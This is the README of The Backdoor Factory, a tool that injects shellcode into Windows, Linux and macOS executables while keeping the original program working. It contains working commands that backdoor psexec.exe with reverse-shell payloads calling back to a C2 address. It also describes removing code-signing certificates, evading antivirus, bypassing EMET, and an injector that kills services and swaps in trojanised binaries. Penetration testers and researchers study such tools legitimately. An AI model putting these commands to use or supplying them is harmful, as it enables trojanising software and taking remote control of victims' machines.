
##The Backdoor Factory (BDF)
For security professionals and researchers only.

The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.

DerbyCon 2014 Presentation: http://www.youtube.com/watch?v=LjUN9MACaTs

Contact the developer on:
  
    IRC:
    irc.freenode.net #BDFactory 

    Twitter:
    @midnite_runr


Under a BSD 3 Clause License

See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki

Dependences: 

Capstone, using the 'next' repo until it is the 'master' repo: 
https://github.com/aquynh/capstone/tree/next

Pefile, most recent:
https://code.google.com/p/pefile/

INSTALL:

./install.sh

This will install Capstone with the 'next' repo and use pip to install pefile.

UPDATE:

./update.sh

---

Supporting: 

    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), 
    and Mach-O x86/x64 and those formats in FAT files
    
    Packed Files: PE UPX x86/x64
    
    Experimental: OpenBSD x32 


Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.

    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.


From DerbyCon: 
    
    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs

    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U

    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory


Recently tested on many binaries.
---

    Usage: backdoor.py [options]

    Options:
      -h, --help            show this help message and exit
      -f FILE, --file=FILE  File to backdoor
      -s SHELL, --shell=SHELL
                            Payloads that are available for use. Use 'show' to see
                            payloads.
      -H HOST, --hostip=HOST
                            IP of the C2 for reverse connections.
      -P PORT, --port=PORT  The port to either connect back to for reverse shells
                            or to listen on for bind shells
      -J, --cave_jumping    Select this options if you want to use code cave
                            jumping to further hide your shellcode in the binary.
      -a, --add_new_section
                            Mandating that a new section be added to the exe
                            (better success) but less av avoidance
      -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
                            User supplied shellcode, make sure that it matches the
                            architecture that you are targeting.
      -c, --cave            The cave flag will find code caves that can be used
                            for stashing shellcode. This will print to all the
                            code caves of a specific size.The -l flag can be use
                            with this setting.
      -l SHELL_LEN, --shell_length=SHELL_LEN
                            For use with -c to help find code caves of different
                            sizes
      -o OUTPUT, --output-file=OUTPUT
                            The backdoor output file
      -n NSECTION, --section=NSECTION
                            New section name must be less than seven characters
      -d DIR, --directory=DIR
                            This is the location of the files that you want to
                            backdoor. You can make a directory of file backdooring
                            faster by forcing the attaching of a codecave to the
                            exe by using the -a setting.
      -w, --change_access   This flag changes the section that houses the codecave
                            to RWE. Sometimes this is necessary. Enabled by
                            default. If disabled, the backdoor may fail.
      -i, --injector        This command turns the backdoor factory in a hunt and
                            shellcode inject type of mechinism. Edit the target
                            settings in the injector module.
      -u SUFFIX, --suffix=SUFFIX
                            For use with injector, places a suffix on the original
                            file for easy recovery
      -D, --delete_original
                            For use with injector module.  This command deletes
                            the original file.  Not for use in production systems.
                            *Author not responsible for stupid uses.*
      -O DISK_OFFSET, --disk_offset=DISK_OFFSET
                            Starting point on disk offset, in bytes. Some authors
                            want to obfuscate their on disk offset to avoid
                            reverse engineering, if you find one of those files
                            use this flag, after you find the offset.
      -S, --support_check   To determine if the file is supported by BDF prior to
                            backdooring the file. For use by itself or with
                            verbose. This check happens automatically if the
                            backdooring is attempted.
      -M, --cave-miner      Future use, to help determine smallest shellcode
                            possible in a PE file
      -q, --no_banner       Kills the banner.
      -v, --verbose         For debug information output.
      -T IMAGE_TYPE, --image-type=IMAGE_TYPE
                            ALL, x86, or x64 type binaries only. Default=ALL
      -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
                            certificate table effectively removing the certificate
                            from the binary for all intents and purposes.
      -R, --runas_admin     Checks the PE binaries for 'requestedExecutionLevel
                            level="highestAvailable"'. If this string is included
                            in the binary, it must run as system/admin. Doing this
                            slows patching speed significantly.
      -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
                            Patches by default.
      -F FAT_PRIORITY, --FAT_PRIORITY=FAT_PRIORITY
                            For MACH-O format. If fat file, focus on which arch to
                            patch. Default is x64. To force x86 use -F x86, to
                            force both archs use -F ALL.
---

##Features:

###PE Files

    Can find all codecaves in an EXE/DLL.
    By default, clears the pointer to the PE certificate table, thereby unsigning a binary.
    Can inject shellcode into code caves or into a new section.
    Can find if a PE binary needs to run with elevated privileges.
    When selecting code caves, you can use the following commands:
      -Jump (j), for code cave jumping
      -Single (s), for patching all your shellcode into one cave
      -Append (a), for creating a code cave
      -Ignore (i), nevermind, ignore this binary
    Can ignore DLLs.

###ELF Files

    Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.

###Mach-O Files
    Pre-Text Section patching and signature removal

###Overall
    
    The user can :
      -Provide custom shellcode.
      -Patch a directory of executables/dlls.
      -Select x32 or x64 binaries to patch only.
      -Include BDF is other python projects see pebin.py and elfbin.py

---------------------------------------------

Sample Usage:
---

###Patch an exe/dll using an existing code cave:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 

    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Looking for caves that will fit the minimum shellcode length of 402
    [*] All caves lengths:  (402,)
    ############################################################
    The following caves can be used to inject code and possibly
    continue execution.
    **Don't like what you see? Use jump, single, append, or ignore.**
    ############################################################
    [*] Cave 1 length as int: 402
    [*] Available caves:
    1. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e4d5 End: 0x2e6d0; Cave Size: 507
    2. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e6e9 End: 0x2e8d5; Cave Size: 492
    3. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e8e3 End: 0x2ead8; Cave Size: 501
    4. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eaf1 End: 0x2ecdd; Cave Size: 492
    5. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2ece7 End: 0x2eee0; Cave Size: 505
    6. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eef3 End: 0x2f0e5; Cave Size: 498
    7. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f0fb End: 0x2f2ea; Cave Size: 495
    8. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f2ff End: 0x2f4f8; Cave Size: 505
    9. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f571 End: 0x2f7a0; Cave Size: 559
    10. Section Name: .rsrc; Section Begin: 0x30600 End: 0x5f200; Cave begin: 0x5b239 End: 0x5b468; Cave Size: 559
    **************************************************
    [!] Enter your selection: 5
    Using selection: 5
    [*] Changing Section Flags
    [*] Patching initial entry instructions
    [*] Creating win32 resume execution stub
    [*] Overwriting certificate table pointer
    [*] psexec.exe backdooring complete
    File psexec.exe is in the 'backdoored' directory

---

###Patch an exe/dll by adding a code section:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Creating Code Cave
    - Adding a new section to the exe/dll for shellcode injection
    [*] Patching initial entry instructions
    [*] Creating win32 resume execution stub
    [*] Overwriting certificate table pointer
    [*] psexec.exe backdooring complete
    File psexec.exe is in the 'backdoored' directory

---

###Patch a directory of exes:
    ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
    ...output too long for README...

---

###User supplied shellcode:
    msfpayload windows/exec CMD='calc.exe' R > calc.bin
    ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin
    This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.

---

###Hunt and backdoor: Injector | Windows Only
    The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
    Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 

---

###Changelog

####12/27/2014

Added payloadtests.py

This script will output patched files in backdoored that will allow for the user to 
test the payloads as they wish. Each payload type increments the port used
by one.

```
Usage: payloadtest.py binary HOST PORT

```


####12/17/2014

OS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp 

-B 15  --> set beacon time for 15 secs

Bug fix to support OS X for BDFProxy



####10/11/2014

PE UPX Patching Added



####9/26/2014

Mach-O x86/x64 added

x86 IAT payload optimization



####7/31/2014 

Added support for ARM x32 LE ELF patching



####7/22/2014 

Added FreeBSD x32 ELF patching support

Change to BSD 3 Clause License



####7/13/2014 

Incorporated Capstone: http://www.capstone-engine.org/

During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.

Renamed loadliba_reverse_tcp to iat_reverse_tcp.

Small optimizations for speed.



####5/30/2014 

Added a new win86 shellcode: loadliba_reverse_tcp
    
  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
  - Bypasses EMET 4.1. The caller protection doesn't catch it.
  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.

---

